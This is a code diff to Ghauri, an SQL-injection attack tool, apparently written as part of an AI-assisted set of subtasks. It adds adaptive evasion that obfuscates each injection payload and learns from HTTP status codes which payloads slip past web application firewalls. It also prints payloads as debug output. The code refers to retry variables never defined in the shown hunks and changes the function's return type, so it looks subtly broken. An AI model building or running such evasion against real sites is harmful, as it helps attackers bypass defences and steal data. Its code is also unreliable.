@@ -29,6 +29,9 @@ from ghauri.core.request import request
 from ghauri.logger.colored_logger import logger
 from ghauri.common.lib import re, time, collections, quote, unquote, URLError
 from ghauri.common.utils import prepare_attack_request, urldecode
+# Imports from previous subtasks, assuming they should be here:
+from ghauri.evasion import apply_quantum_evasion, learn_from_response
+from ghauri.ghauri import quantum_evasion_engine
 
 
 def inject_expression(
@@ -50,16 +53,44 @@ def inject_expression(
     attack_data = data
     attack_headers = headers
     param_value = parameter.value
-    if expression:
-        expression = expression.replace("[ORIGVALUE]", param_value.replace("*", ""))
-        logger.payload(f"{urldecode(expression)}")
+    
+    final_expression_sent = expression # Holds the payload that is actually sent
+
+    if expression and not connection_test: # Obfuscation only if there's an expression and not a plain connection test
+        original_expression_for_context = expression.replace("[ORIGVALUE]", param_value.replace("*", ""))
+        
+        # Determine DBMS for context_vector
+        current_dbms = conf.backend if conf.backend else "generic"
+        
+        obfuscated_expression = apply_quantum_evasion(
+            original_expression_for_context, 
+            context_vector={"type": "sql", 
+                            "target_waf": "unknown", 
+                            "injection_type": injection_type,
+                            "dbms": current_dbms}, 
+            engine_instance=quantum_evasion_engine
+        )
+        
+        # As per subtask 3, print statements for debugging:
+        print(f"--- Ghauri Payload Debug ---")
+        print(f"Original Payload (in inject_expression): {urldecode(original_expression_for_context)}")
+        print(f"Obfuscated Payload (in inject_expression): {urldecode(obfuscated_expression)}")
+        print(f"----------------------------")
+        
+        final_expression_sent = obfuscated_expression 
+        logger.payload(f"{urldecode(final_expression_sent)}")
+    elif expression and connection_test: # For connection test with expression (e.g. heuristic check)
+        final_expression_sent = expression.replace("[ORIGVALUE]", param_value.replace("*", ""))
+        logger.payload(f"{urldecode(final_expression_sent)}")
+    # If expression is None, final_expression_sent remains None
+
     if conf.timeout and conf.timeout > 30:
         timeout = conf.timeout
     if not connection_test:
         if injection_type == "HEADER":
             attack_headers = prepare_attack_request(
                 headers,
-                expression,
+                final_expression_sent,
                 param=parameter,
                 injection_type=injection_type,
             )
@@ -75,7 +106,7 @@ def inject_expression(
                 conf._is_cookie_choice_taken = True
             attack_headers = prepare_attack_request(
                 headers,
-                expression,
+                final_expression_sent,
                 param=parameter,
                 encode=conf._encode_cookie,
                 injection_type=injection_type,
@@ -83,7 +114,7 @@ def inject_expression(
         if injection_type == "GET":
             attack_url = prepare_attack_request(
                 url,
-                expression,
+                final_expression_sent,
                 param=parameter,
                 encode=True,
                 injection_type=injection_type,
@@ -92,13 +123,13 @@ def inject_expression(
         if injection_type == "POST":
             attack_data = prepare_attack_request(
                 data,
-                expression,
+                final_expression_sent,
                 param=parameter,
                 encode=True,
                 injection_type=injection_type,
             )
     try:
-        attack = request.perform(
+        attack = request.perform( # This is the HTTPResponse object
             url=attack_url,
             data=attack_data,
             proxy=conf.proxy,
@@ -158,11 +189,44 @@ def inject_expression(
                 # start counting from 0 as we have found our response for the current character guess in
                 # configured retries..
                 conf.retry_counter = 0
-        if response_ok:
-            return attack
-        else:
+
+        # Learn from successful retry within URLError block
+        if response_ok and attack_from_retry and final_expression_sent: # attack_from_retry is the response from successful retry
+            learn_success_recursive = attack_from_retry.ok and attack_from_retry.status_code not in [403, 406, 429, 500]
+            # Ensure context_vector for learning also includes DBMS
+            learn_context_vector_retry = {"type": "http_outcome_urllib_retry", 
+                                          "target_waf": "unknown", 
+                                          "injection_type": injection_type, 
+                                          "connection_test": connection_test,
+                                          "dbms": conf.backend if conf.backend else "generic"}
+            learn_from_response(
+                payload_string=final_expression_sent,
+                response_status=attack_from_retry.status_code,
+                context_vector=learn_context_vector_retry,
+                success=learn_success_recursive,
+                engine_instance=quantum_evasion_engine
+            )
+            return attack_from_retry, final_expression_sent # Return from successful retry
+
+        # If not response_ok after retries
+        if not response_ok and final_expression_sent and attack: # 'attack' here would be the last failed attempt from original try
+            learn_context_vector_fail = {"type": "http_outcome_urllib_fail", 
+                                         "target_waf": "unknown", 
+                                         "injection_type": injection_type, 
+                                         "connection_test": connection_test,
+                                         "dbms": conf.backend if conf.backend else "generic"}
+            learn_from_response(
+                payload_string=final_expression_sent,
+                response_status=attack.status_code if attack else 0, # Check if attack exists
+                context_vector=learn_context_vector_fail,
+                success=False, # Failed if this path is taken
+                engine_instance=quantum_evasion_engine
+            )
+        # Original exit path if retries fail
+        if not response_ok:
             logger.end("ending")
             exit(0)
+
     except ConnectionAbortedError as e:
         raise e
     except ConnectionRefusedError as e:
@@ -203,7 +267,59 @@ def inject_expression(
                 # configured retries..
                 conf.retry_counter = 0
                 response_ok = True
-        if response_ok:
-            return attack
-        raise e
-    return attack
+
+            # Learn from successful retry within general Exception block
+            if response_ok and attack_from_exception_retry and final_expression_sent: # attack_from_exception_retry is the response
+                learn_success_exception_retry = attack_from_exception_retry.ok and attack_from_exception_retry.status_code not in [403, 406, 429, 500]
+                # Ensure context_vector for learning also includes DBMS
+                learn_context_vector_ex_retry = {"type": "http_outcome_exception_retry", 
+                                               "target_waf": "unknown", 
+                                               "injection_type": injection_type, 
+                                               "connection_test": connection_test,
+                                               "dbms": conf.backend if conf.backend else "generic"}
+                learn_from_response(
+                    payload_string=final_expression_sent,
+                    response_status=attack_from_exception_retry.status_code,
+                    context_vector=learn_context_vector_ex_retry,
+                    success=learn_success_exception_retry,
+                    engine_instance=quantum_evasion_engine
+                )
+                return attack_from_exception_retry, final_expression_sent # Return from successful retry
+            
+            # If not response_ok after retries in exception block
+            if not response_ok and final_expression_sent and attack: # 'attack' here would be the last failed attempt
+                learn_context_vector_ex_fail = {"type": "http_outcome_exception_fail", 
+                                              "target_waf": "unknown", 
+                                              "injection_type": injection_type, 
+                                              "connection_test": connection_test,
+                                              "dbms": conf.backend if conf.backend else "generic"}
+                learn_from_response(
+                    payload_string=final_expression_sent,
+                    response_status=attack.status_code if attack else 0,
+                    context_vector=learn_context_vector_ex_fail,
+                    success=False, # Failed if this path is taken
+                    engine_instance=quantum_evasion_engine
+                )
+            if not response_ok: # If still not ok, raise the original exception
+                raise e
+
+    # Primary learning call for the main execution path (if no exception or after successful try)
+    if final_expression_sent and attack: # attack is the HTTPResponse from the initial try block
+        # Define success: e.g., HTTP request was okay and not an obvious WAF block.
+        success_for_learning = attack.ok and attack.status_code not in [403, 406, 429, 500] 
+        
+        # Ensure context_vector for learning also includes DBMS
+        learn_context_vector_direct = {"type": "http_outcome_direct", 
+                                       "target_waf": "unknown", 
+                                       "injection_type": injection_type, 
+                                       "connection_test": connection_test,
+                                       "dbms": conf.backend if conf.backend else "generic"}
+        learn_from_response(
+            payload_string=final_expression_sent,
+            response_status=attack.status_code,
+            context_vector=learn_context_vector_direct,
+            success=success_for_learning,
+            engine_instance=quantum_evasion_engine
+        )
+
+    return attack, final_expression_sent # Return tuple, including the potentially obfuscated payload
